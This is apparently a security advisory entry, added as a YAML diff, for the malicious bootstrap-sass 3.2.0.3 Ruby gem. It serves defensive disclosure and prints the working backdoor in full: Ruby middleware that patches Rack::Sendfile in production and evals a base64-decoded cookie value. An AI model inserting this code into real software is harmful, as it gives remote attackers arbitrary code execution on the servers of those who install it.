@@ -1,0 +1,53 @@
+---
+- id: snykio:rubygems:bootstrap-sass:174093
+  title: Malicious Package
+  description: |+
+    [bootstrap-sass][1] is a Sass-powered version of Bootstrap 3, ready to
+    drop right into your Sass powered applications.
+
+    Affected versions of this package are malicious. The file
+    `lib/active-controller/middleware.rb` contains a backdoor which will
+    enable a remote attacker to run arbitrary code on the server by decoding
+    a specific cookie value and evaluating its content.
+
+
+
+    [1]: https://rubygems.org/gems/bootstrap-sass
+    \nWhen `bootstrap-sass` gets imported, it also imports the following
+    malicious middleware code that resides on
+    `lib/active-controller/middleware.rb`\:
+
+        begin
+         require 'rack/sendfile'
+         if Rails.env.production?
+           Rack::Sendfile.tap do |r|
+             r.send :alias_method, :c, :call
+             r.send(:define_method, :call) do |e|
+               begin
+                 x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
+                 eval(x) if x
+               rescue Exception
+               end
+               c(e)
+             end
+           end
+         end
+        rescue Exception
+         nil
+        end
+
+  affected_package: bootstrap-sass
+  vulnerable_versions:
+  - ">=3.2.0.3  <3.2.0.4"
+  severity: high
+  package_manager: rubygems
+  cwe:
+  - CWE-506
+  disclosed_date: 2019-03-26
+  created_date: 2019-04-03
+  last_modified_date: 2019-04-03
+  credit:
+  - Derek Barnes
+  references:
+  - https://github.com/twbs/bootstrap-sass/issues/1195#issuecomment-479047836
+  source_url: https://snyk.io/vuln/SNYK-RUBY-BOOTSTRAPSASS-174093
